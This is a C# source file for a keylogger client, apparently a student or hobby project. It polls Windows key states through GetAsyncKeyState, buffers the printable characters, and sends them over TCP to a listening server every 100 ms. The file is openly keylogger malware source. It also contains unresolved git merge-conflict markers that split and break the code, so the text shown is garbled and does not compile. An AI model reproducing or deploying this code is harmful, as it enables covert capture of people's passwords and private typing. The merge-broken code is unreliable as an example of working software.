using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;// for using GetAsyncKeyState()
using System.Text;
using System.Threading;
using System.Threading.Tasks;

using Common;

namespace KeyloggerClient
{
    
    public class KeyloggerClient
    {

        /// <summary>
        /// Imports the GetAsyncKeyState function from user32.dll.
        /// Used to check the state of a virtual key at the time the function is called.
        /// </summary>
        /// <param name="i">The virtual-key code.</param>
        /// <returns>A short value indicating the key state.</returns>
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        private TcpClient client;
        private NetworkStream stream;
        private StringBuilder keyBuffer = new StringBuilder(); // stores captured keystrokes
        private DateTime lastSend = DateTime.Now; // tracks last time data was sent
        private CancellationTokenSource cts; //cancel the key capture loop

<<<<<<< HEAD
        /// <summary>
        /// Starts the keylogger client by connecting to the specified server and beginning the key capture loop.
        /// </summary>
        /// <param name="host">The IP address of the server (default is "127.0.0.1").</param>
        /// <param name="port">The port to connect to (default is 5000).</param>
        /// <returns>A Task representing the asynchronous operation.</returns>
        public async Task StartAsync(string host = "127.0.0.1", int port = 5000)
=======
        private readonly IKeyStateProvider _keyStateProvider;

        public bool IsConnected => client?.Connected == true;
        public bool _running = false;

        public async Task StartAsync(CancellationToken cancellationToken = default, string host = "127.0.0.1", int port = 5000)
>>>>>>> eeb19b3796f2a0839e32c8b80c6d2cfadff9ecc7
        {
            try
            {
                client = new TcpClient(host, port);
                stream = client.GetStream();


                /// <summary>
                /// Sends a handshake message to identify this as a client.
                /// </summary>
                byte[] handshake = Encoding.UTF8.GetBytes("client");
                await stream.WriteAsync(handshake, 0, handshake.Length);

                cts = new CancellationTokenSource();
                //await CaptureKeysLoop(cts.Token); // Start key capture loop
                //_ = Task.Run(() => CaptureKeysLoop(cts.Token));

                Console.WriteLine("Client: running");
                var acceptTask = Task.Run(() => CaptureKeysLoop(cts.Token), cancellationToken);
                _running = true;
                // Așteptăm fie cancelare, fie până când serverul este oprit
                while (_running && !cancellationToken.IsCancellationRequested)
                {
                    await Task.Delay(1000, cancellationToken);
                }
            }
            catch (Exception ex)
            {
                throw new KeyloggerException("Failed to start keylogger client.", ex);
            }
        }
        /// <summary>
        /// Stops the keylogger client by cancelling the loop and closing the network connection.
        /// </summary>
        public void Stop()
        {
            cts?.Cancel();
            stream?.Close();
            client?.Close();
        }


        /// <summary>
        /// Continuously captures keystrokes and sends them to the server periodically.
        /// Only printable ASCII characters (32 to 126) are captured.
        /// </summary>
        /// <param name="token">A cancellation token used to stop the loop safely.</param>
        /// <returns>A Task representing the asynchronous operation.</returns>
        private async Task CaptureKeysLoop(CancellationToken token)
        {
            try
            {
                while (!token.IsCancellationRequested)
                {
                    await Task.Delay(5); // Small delay to reduce CPU usage
                    /// <summary>
                    /// Iterates through printable ASCII characters and checks if any were pressed.
                    /// </summary>

                    CaptureKeys();

<<<<<<< HEAD
                    /// <summary>
                    /// Sends captured keys every 100ms if any were collected.
                    /// </summary>

                    if ((DateTime.Now - lastSend).TotalMilliseconds >= 100 && keyBuffer.Length > 0)
                    {
                        string message = keyBuffer.ToString();
                        byte[] data = Encoding.UTF8.GetBytes(message);
=======
>>>>>>> eeb19b3796f2a0839e32c8b80c6d2cfadff9ecc7

                    await SendData();
                }
            }
            catch (Exception ex)
            {
                throw new KeyloggerException("Error occurred while capturing or sending keys.", ex);
            }
        }

        public void CaptureKeys(char character = ' ')
        {
            if (character != ' ')
            {
                keyBuffer.Append(character);
            }

            for (int i = 32; i < 127; i++)
            {
                int keyState = GetAsyncKeyState(i);
                if ((keyState & 0x1) != 0)
                {
                    char keyChar = (char)i;
                    Console.Write(keyChar + ", ");
                    keyBuffer.Append(keyChar);
                }
            }
        }
        private async Task SendData()
        {
            if ((DateTime.Now - lastSend).TotalMilliseconds >= 100 && keyBuffer.Length > 0)
            {
                string message = keyBuffer.ToString();
                byte[] data = Encoding.UTF8.GetBytes(message);

                try
                {
                    await stream.WriteAsync(data, 0, data.Length);
                }
                catch (Exception ex)
                {
                    throw new KeyloggerException("Failed to send data to the server.", ex);
                }

                keyBuffer.Clear();
                lastSend = DateTime.Now;
            }
        }
        public String getKeyBuffer()
        {
            return keyBuffer.ToString();
        }
    }

}
